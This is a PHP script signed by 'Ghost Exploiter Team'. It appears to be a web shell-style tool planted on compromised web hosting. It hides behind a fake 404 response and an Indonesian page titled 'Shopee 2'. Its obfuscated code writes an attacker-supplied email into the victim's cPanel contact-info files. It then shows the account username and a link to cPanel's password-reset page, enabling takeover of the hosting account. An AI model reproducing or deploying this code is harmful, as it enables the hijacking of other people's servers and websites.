<?php error_reporting(0); 
header("HTTP/1.0 404 Not Found"); 
echo '<!DOCTYPE HTML> 
<html> 
<head>
<title>Shopee 2</title> 
<style type="text/css"> 
	body{ 
		background-color: #000000;
		} 
	header { 
		color: blue; 
		margin: 10px auto; 
		} 
	input[type=password] { 
		width: 250px; 
		height: 25px; 
		color: red; 
		background: transparent; 
		border: 1px dotted red; 
		margin-left: 20px; 
		text-align: center; 
		} 
	a { 
		text-decoration: none; 
		color: red; 
		} 
</style> 	 
</head> 
<center> 
<header> 
<img src="https://i.ibb.co/X5Lx99x/20190629-150039.png" width="500" heigh="500"><br>
<h1>Capten_Maxi </h1> 
</header>  
<form action="#" method="post"> 	
<input type="email" name="email" placeholder="Masukan Email Lu Gan" size="30" /> 	 
<input type="submit" name="submit" value="Gaskeun Gan" size="50"/> 	 
</form><br/><br/><font color="pink">
<h5>
	 Andai Saja Kamu Adalah Web Yang Memiliki Bug SQLi<br>
	 Aku Akan Inject Hati Kamu<br>
	 Lalu Akan Mencari Akses Login Kedalam Otakmu<br>
	 Dan Mengubah Database Dalam Otakmu Menjadi Namaku<br>
	 Tapi Sayang Kamu Bukanlah Website Melainkan<br>
	 Wanita Yang Kucintai Dalam Diamnya Diriku
	 </h5>
<br/><b><h5><font color="red">	
..::Ghost Exploiter Team::..
<br/><br/><br/> 	 
</h5>
'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Yah Ga Bisa Gan:(</h1><br><br> </pre></center>"; } else { echo "<center>Salin ini Gan <br><br></center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">ini usernya</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Saatnya Gass Cpanel</a><br><br></center>'; ;}} ?> 
</center>
</div><!--End of /.coverBg-->
</body> 
</html>
      
